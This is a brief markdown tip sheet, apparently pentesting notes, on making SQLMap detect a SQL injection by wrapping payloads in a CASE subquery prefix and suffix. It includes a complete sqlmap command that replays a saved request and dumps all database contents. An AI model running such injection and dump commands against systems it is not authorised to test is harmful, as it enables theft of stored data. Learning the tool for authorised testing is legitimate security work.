## Usage of Prefix and Suffix to cause injection

SQLMap works best when injecting into `WHERE` clauses. As such, use prefix and suffix to force SQLMap to inject into a subquery to increase the likelihood of it recognising the injection. 

```bash
./sqlmap.py -r ../../Desktop/filteredsearch.req -v 6 --force-ssl --code 200 --regexp '<section class=blog-list>
                        <div class="blog-post">
                        <a href="/post?postId=6">' --prefix '(CASE WHEN (1=(SELECT 1 WHERE 2=2 ' --suffix ')) THEN AUTHOR ELSE TITLE END) --' --dump-all
```

## Debugging SQLMap 

Increase the verbosity of the script to view the requests and payloads being sent. This would enable you to debug. 